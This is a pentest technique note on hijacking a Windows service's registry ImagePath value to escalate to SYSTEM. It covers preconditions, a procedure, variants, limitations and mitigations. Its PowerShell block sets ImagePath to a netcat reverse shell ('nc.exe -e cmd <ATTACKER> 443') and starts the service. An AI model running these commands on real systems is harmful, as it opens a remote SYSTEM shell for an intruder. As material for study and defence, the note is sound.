---
topic: Windows service ImagePath hijacking
tags: [windows, services, registry, privesc, persistence]
---

# Windows service ImagePath hijacking

[🌐 Español](service-imagepath-hijack.md) | **English**

## Concept

Windows starts service processes from the registry `ImagePath` value. If an unprivileged user can write to the key of a service running as `LocalSystem` and can start it, they can replace the binary with their own and gain SYSTEM.

## When it applies

- `sc sdshow <service>` grants `RP` or `WD` to `AU`/`Authenticated Users`.
- The service uses `ObjectName=LocalSystem`.
- The service is stopped or can be restarted.

## Procedure

1. Enumerate services and permissions with `accesschk` or `sc sdshow`.
2. Copy a controlled executable to a writable path.
3. Change `ImagePath` and start the service.
4. Catch the shell as SYSTEM.

```powershell
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc qc <SERVICE>
sc sdshow <SERVICE>
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\<SERVICE> -Name ImagePath -Value "C:\Windows\Temp\nc.exe -e cmd <ATTACKER> 443"
Start-Service <SERVICE>
```

## Variants

- Modify `ServiceDll` in `svchost` services.
- Abuse `FailureCommand` when the service fails.
- Use `sc config binPath=` when allowed.

## Limitations

- Write and start permissions are required.
- Some services verify the binary signature.
- Registry changes may be audited.

## Mitigation and detection

- Review service key ACLs.
- Run services with low-privilege accounts.
- Monitor `ImagePath` and `ServiceDll` changes.

## References

- <https://learn.microsoft.com/en-us/windows/win32/services/service-registry-information>
- <https://attack.mitre.org/techniques/T1543/003/>
- <https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk>
